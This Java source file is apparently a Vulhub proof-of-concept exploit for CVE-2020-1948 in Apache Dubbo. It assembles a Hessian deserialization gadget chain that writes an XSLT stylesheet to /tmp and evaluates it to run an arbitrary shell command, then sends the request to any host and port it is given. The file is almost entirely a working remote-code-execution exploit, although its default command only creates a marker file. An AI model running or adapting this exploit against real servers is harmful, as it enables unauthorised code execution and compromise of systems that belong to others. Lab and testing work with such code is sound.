package org.vulhub.poc;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.com.caucho.hessian.io.SerializerFactory;

import javax.swing.UIDefaults;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Random;

public class CVE20201948 {
    private static final byte[] MAGIC = new byte[]{(byte) 0xda, (byte) 0xbb};
    private static final byte FLAG_REQUEST = (byte) 0x80;
    private static final byte FLAG_TWOWAY = (byte) 0x40;
    private static final byte HESSIAN2_SERIALIZATION_ID = 2;

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2020-1948 <host> <port> [command]");
            System.err.println("Example: CVE-2020-1948 127.0.0.1 20880 \"touch /tmp/success\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        String command = positional.length == 3 ? positional[2] : "touch /tmp/success";

        byte[] payload = serializeDubboRequest(generatePayload(command));
        PocUtils.send(host, port, payload);

        System.out.println("Payload sent to " + host + ":" + port);
    }

    private static byte[] serializeDubboRequest(Object payload) throws Exception {
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(body);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        out.setSerializerFactory(serializerFactory);
        out.writeString("2.7.5");
        out.writeString("org.vulhub.api.UnknownService");
        out.writeString("");
        out.writeString("unknownMethod");
        out.writeString("Ljava/lang/Object;");
        out.writeObject(payload);
        out.writeObject(new HashMap<String, String>());
        out.flushBuffer();
        out.close();

        byte[] data = body.toByteArray();
        ByteArrayOutputStream request = new ByteArrayOutputStream();
        request.write(MAGIC);
        request.write(FLAG_REQUEST | FLAG_TWOWAY | HESSIAN2_SERIALIZATION_ID);
        request.write(0);
        writeLong(request, new Random().nextLong());
        writeInt(request, data.length);
        request.write(data);
        return request.toByteArray();
    }

    private static Object generatePayload(String command) throws Exception {
        String tmpPath = "/tmp/CACHE_XML_" + Math.abs(new Random().nextInt());
        String xml = buildXml(command, tmpPath);

        UIDefaults.ProxyLazyValue writeValue = new UIDefaults.ProxyLazyValue(
                "com.sun.org.apache.xml.internal.security.utils.JavaUtils",
                "writeBytesToFilename",
                new Object[]{tmpPath, xml.getBytes(StandardCharsets.UTF_8)}
        );
        setFieldValue(writeValue, "acc", null);

        UIDefaults.ProxyLazyValue processValue = new UIDefaults.ProxyLazyValue(
                "com.sun.org.apache.xalan.internal.xslt.Process",
                "_main",
                new Object[]{new String[]{"-XT", "-XSL", "file://" + tmpPath}}
        );
        setFieldValue(processValue, "acc", null);

        HashMap<Object, Object> map1 = new HashMap<>(1);
        HashMap<Object, Object> map2 = new HashMap<>(1);
        HashMap<Object, Object> map3 = new HashMap<>(1);
        HashMap<Object, Object> map4 = new HashMap<>(1);
        map1.put("a", new UIDefaults(new Object[]{"abc", writeValue}));
        map2.put("a", new UIDefaults(new Object[]{"abc", writeValue}));
        map3.put("b", new UIDefaults(new Object[]{"ccc", processValue}));
        map4.put("b", new UIDefaults(new Object[]{"ccc", processValue}));

        return toCollisionMap(Arrays.asList(map1, map2, map3, map4));
    }

    private static String buildXml(String command, String tmpPath) {
        String script = "java.lang.Runtime.getRuntime().exec('" + jsString(command) + "').waitFor();";

        return "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n"
                + "                xmlns:se=\"http://xml.apache.org/xalan/java/javax.script.ScriptEngineManager\"\n"
                + "                xmlns:js=\"http://xml.apache.org/xalan/java/javax.script.ScriptEngine\">\n"
                + "    <xsl:template match=\"/\">\n"
                + "        <xsl:variable name=\"code\" select=\"&quot;" + xmlAttribute(script) + "&quot;\" />\n"
                + "        <xsl:variable name=\"result\" select=\"js:eval(se:getEngineByName(se:new(),'js'), $code)\"/>\n"
                + "        <xsl:value-of select=\"$result\"/>\n"
                + "    </xsl:template>\n"
                + "</xsl:stylesheet>\n";
    }

    private static String jsString(String value) {
        return value.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r");
    }

    private static String xmlAttribute(String value) {
        return value.replace("&", "&amp;")
                .replace("\"", "&quot;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }

    private static HashMap<?, ?> toCollisionMap(List<?> objs) throws Exception {
        HashMap<?, ?> map = new HashMap<>(8);
        setFieldValue(map, "size", objs.size());
        Class<?> nodeClass;
        try {
            nodeClass = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeClass = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeConstructor = nodeClass.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeClass);
        nodeConstructor.setAccessible(true);
        Object table = Array.newInstance(nodeClass, objs.size());
        for (int i = 0; i < objs.size(); i++) {
            Array.set(table, i, nodeConstructor.newInstance(0, objs.get(i), objs.get(i), null));
        }
        setFieldValue(map, "table", table);
        return map;
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static Field getField(Class<?> clazz, String fieldName) throws NoSuchFieldException {
        Class<?> current = clazz;
        while (current != null) {
            try {
                return current.getDeclaredField(fieldName);
            } catch (NoSuchFieldException ignored) {
                current = current.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    private static void writeInt(OutputStream out, int value) throws Exception {
        out.write((value >>> 24) & 0xff);
        out.write((value >>> 16) & 0xff);
        out.write((value >>> 8) & 0xff);
        out.write(value & 0xff);
    }

    private static void writeLong(OutputStream out, long value) throws Exception {
        out.write((int) ((value >>> 56) & 0xff));
        out.write((int) ((value >>> 48) & 0xff));
        out.write((int) ((value >>> 40) & 0xff));
        out.write((int) ((value >>> 32) & 0xff));
        out.write((int) ((value >>> 24) & 0xff));
        out.write((int) ((value >>> 16) & 0xff));
        out.write((int) ((value >>> 8) & 0xff));
        out.write((int) (value & 0xff));
    }
}
